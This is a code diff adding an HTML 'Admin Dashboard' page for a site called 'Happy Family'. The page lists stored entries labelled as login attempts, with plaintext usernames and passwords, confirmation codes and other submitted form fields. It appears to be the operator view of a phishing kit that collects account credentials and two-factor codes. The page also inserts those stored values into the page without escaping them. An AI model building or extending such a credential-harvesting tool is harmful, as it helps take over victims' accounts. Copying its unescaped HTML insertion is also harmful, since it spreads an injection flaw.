@@ -1,0 +1,59 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Happy Family - Admin</title>
+  <link rel="stylesheet" href="style.css">
+  <style>
+    .admin-container {text-align: left;max-width: 800px;margin: 0 auto;}
+    .log-entry {background: #f9f9f9;border: 1px solid #ddd;border-radius: 8px;
+      padding: 15px;margin-bottom: 15px;box-shadow: 0 2px 4px rgba(0,0,0,0.05);
+      opacity: 0;transform: translateY(20px);animation: slideUp 0.6s forwards;}
+    @keyframes slideUp {to {opacity: 1;transform: translateY(0);} }
+    .log-entry h3 {margin-bottom: 8px;font-size: 16px;color: #1877f2;}
+    .log-entry p {margin: 4px 0;font-size: 14px;color: #333;}
+  </style>
+</head>
+<body>
+  <div class="container admin-container">
+    <div class="logo"><div class="logo-circle">H</div></div>
+    <h2>Admin Dashboard</h2>
+    <div id="logs"></div>
+  </div>
+  <footer>
+    <p>Happy Family © 2025 – Private Admin View</p>
+  </footer>
+  <script>
+    const logs = JSON.parse(localStorage.getItem("happyFamilyLogs")) || [];
+    const logsDiv = document.getElementById("logs");
+    if (logs.length === 0) {
+      logsDiv.innerHTML = "<p>No data submitted yet.</p>";
+    } else {
+      logs.forEach((entry, i) => {
+        const div = document.createElement("div");
+        div.classList.add("log-entry");
+        div.style.animationDelay = (i * 0.2) + "s";
+        let content = "";
+        if (entry.username && entry.password) {
+          content += `<h3>Login Attempt</h3>
+                      <p><b>Username:</b> ${entry.username}</p>
+                      <p><b>Password:</b> ${entry.password}</p>`;
+        }
+        if (entry.confirmationCode) {
+          content += `<h3>Confirmation Code</h3>
+                      <p><b>Code:</b> ${entry.confirmationCode}</p>`;
+        }
+        if (entry.formData) {
+          content += `<h3>Form Submission</h3>`;
+          for (let key in entry.formData) {
+            content += `<p><b>${key}:</b> ${entry.formData[key]}</p>`;
+          }
+        }
+        div.innerHTML = content;
+        logsDiv.appendChild(div);
+      });
+    }
+  </script>
+</body>
+</html>
